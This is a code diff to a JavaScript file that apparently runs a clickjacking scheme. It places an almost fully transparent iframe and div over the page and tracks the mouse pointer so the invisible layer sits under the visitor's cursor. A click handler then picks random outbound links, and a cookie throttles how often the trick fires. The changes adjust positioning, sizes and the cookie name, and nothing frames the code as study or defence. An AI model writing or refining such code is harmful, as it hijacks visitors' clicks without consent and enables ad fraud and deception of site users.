@@ -5,7 +5,7 @@ let h12_div = null;
 let h12_link = null;
 let obgWidth = window.innerWidth;
 let uniqueID = '_' + Math.random().toString(36).substr(2, 9);
-let htmlCode = '<div id="_z0s59a_div'+ uniqueID +'"><iframe frameborder="0" scrolling="0" id="_z0s59a_obj'+ uniqueID +'" type="text/html" style="width:100%;height:100%;overflow:hidden;"></iframe></div>';
+let htmlCode = '<div id="_z0s59a_div'+ uniqueID +'"><iframe frameborder="0" scrolling="no" id="_z0s59a_obj'+ uniqueID +'" type="text/html" style="position: relative;width:100%;height:100%;overflow:hidden;"></iframe></div>';
 let cssCode = '<style>#_z0s59a_div'+ uniqueID +'{position:fixed;z-index:-999999;bottom:0;left:0;height:100%;width:100%;opacity:0.001;overflow:hidden;}</style>';
 let pointerTracker = function(e){
     let out = {x:0, y:0};
@@ -86,10 +86,10 @@ function showDiv() {
 
     let _w = (obgWidth - 940) / 2;
     $("#_z0s59a_obj" + uniqueID).css("top", "-140px").css("left", "-"+ _w +"px").css("pointer-events", "");
-    $("#_z0s59a_div" + uniqueID).css("width", "940px").css("height", "200px").css("z-index", "90000").css("position", "fixed");
+    $("#_z0s59a_div" + uniqueID).css("width", "940px").css("height", "180px").css("z-index", "90000").css("position", "absolute");
 }
 function setClick(){
-    setCookie("_zx1_delay_time",  "1", 4);
+    setCookie("_zkx1_delay_time",  "1", 4);
     document.activeElement.blur();
 }
 function startTracker() {
@@ -122,7 +122,7 @@ function h12_startScript(){
 
     $("#" + h12_div).css("z-index", "-90000").css("position", "fixed").css("top", "0").css("opacity", "0.0001").css("pointer-events", "none");
     $("#" + h12_div + ' .mgline').css("margin", "0");
-    if(getCookie("_zx1_delay_time") == null){
+    if(getCookie("_zkx1_delay_time") == null){
         $('#'+ h12_div +' .mgheader').remove();
         $('#'+ h12_div +' a').click(function(){h12_clickfuncion(); return false;});
 
@@ -131,7 +131,7 @@ function h12_startScript(){
 }
 function h12_followDiv() {
     h12_canTrack = 1;
-    $("#" + h12_div).css("z-index", "90000").css("position", "fixed").css("opacity", "0.0001").css("width", "600px").css("pointer-events", "");
+    $("#" + h12_div).css("z-index", "90000").css("position", "absolute").css("opacity", "0.0001").css("width", "600px").css("pointer-events", "");
 }
 function h12_clickfuncion() {
     let randLinks = $('#'+ h12_div +' a[href^="https://www."]');
